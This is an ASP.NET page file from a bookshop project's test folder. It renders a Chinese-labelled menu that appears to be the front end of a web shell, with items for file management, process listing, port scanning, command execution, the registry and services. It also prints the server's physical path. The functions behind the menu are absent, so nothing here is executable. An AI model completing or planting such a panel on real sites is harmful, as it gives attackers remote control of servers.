using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace BookShop.Web.test
{
    public partial class WebForm2 : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            string display = "inline";

            string str = @"<html><body>
    <img id=""runing"" src=""1.gif"" style=""position: absolute; display: none"" />
    <div id=""menu"" style=""display: "+display +@""">
        IP: <a href=""http://ip138.com/ips.asp?ip="+Request.ServerVariables["REMOTE_ADDR"]+@"&action=2"">
            "+Request.ServerVariables["REMOTE_ADDR"]+@"</a>
        <ul style=""float: left"">
            <li><a href=""javascript:GetFileByPath('"+Request.PhysicalApplicationPath.Replace("/", "%2f%2f").Replace("\\", "%2f%2f")+@"')"">
                文件管理&nbsp;</a></li>
            <li><a href=""javascript:GetProcess();"">&nbsp; 查看进程&nbsp; </a></li>
            <li>&nbsp;IIS列表&nbsp;</li>
            <li>&nbsp;<a href=""javascript:ScanPort();"">扫描端口&nbsp; </a></li>
            <li>&nbsp;<a href=""javascript:ShowCmdDiv();"">执行命令</a>&nbsp; </li>
            <li>&nbsp;数据库管理&nbsp; </li>
            <li>&nbsp;注册表&nbsp; </li>
            <li>&nbsp; 服务&nbsp; </li>
        </ul>
    </div>
</body></html>";

            Response.Write(str);
            Response.End();

        }
    }
}
